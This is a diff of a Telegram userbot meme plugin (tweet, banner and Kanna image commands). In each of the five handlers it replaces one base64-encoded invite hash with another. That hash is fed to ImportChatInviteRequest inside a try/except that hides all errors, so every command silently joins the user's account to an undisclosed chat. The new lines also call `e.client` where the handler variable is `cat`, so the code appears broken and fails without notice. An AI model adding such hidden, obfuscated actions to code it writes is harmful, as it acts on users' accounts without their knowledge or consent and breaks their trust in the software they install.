@@ -1,6 +1,21 @@
+"""
+credits to @mrconfused and @sandy1709
+"""
+#    Copyright (C) 2020  sandeep.n(π.$)
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as
+#    published by the Free Software Foundation, either version 3 of the
+#    License, or (at your option) any later version.
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import re
 from telethon import events
-from userbot import CMD_HELP  
+from userbot import CMD_HELP
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from userbot.plugins import trumptweet , moditweet, tweets, deEmojify,changemymind, kannagen
 from userbot.utils import admin_cmd 
 
@@ -23,8 +38,9 @@ async def nekobot(cat):
             return
     await cat.edit("Requesting trump to tweet...")
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await cat.client(san)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await e.client(hmm)
     except:
         pass   
     text = deEmojify(text)
@@ -51,10 +67,11 @@ async def nekobot(cat):
             return
     await cat.edit("Requesting modi to tweet...")
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await cat.client(san)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await e.client(hmm)
     except:
-        pass   
+        pass  
     text = deEmojify(text)
     catfile = await moditweet(text)
     await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
@@ -79,8 +96,9 @@ async def nekobot(cat):
             return
     await cat.edit("Your banner is under creation wait a sec...")    
     try:
-        san = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await cat.client(san)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await e.client(hmm)
     except:
         pass   
     text = deEmojify(text)
@@ -107,10 +125,11 @@ async def nekobot(cat):
             return
     await cat.edit("Kanna is writing your text...")        
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await cat.client(san)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await e.client(hmm)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     catfile = await kannagen(text)
     await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
@@ -134,10 +153,11 @@ async def nekobot(cat):
             await cat.edit("what should i tweet? Give some text and format must be like `.tweet username | your text` ")
             return        
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await cat.client(san)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await e.client(hmm)
     except:
-        pass   
+        pass
     if "|" in text:
         username , text = text.split("|")
     else:
@@ -146,4 +166,4 @@ async def nekobot(cat):
     text = deEmojify(text)
     catfile = await tweets(text,username)
     await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
-    await cat.delete()    
+    await cat.delete()
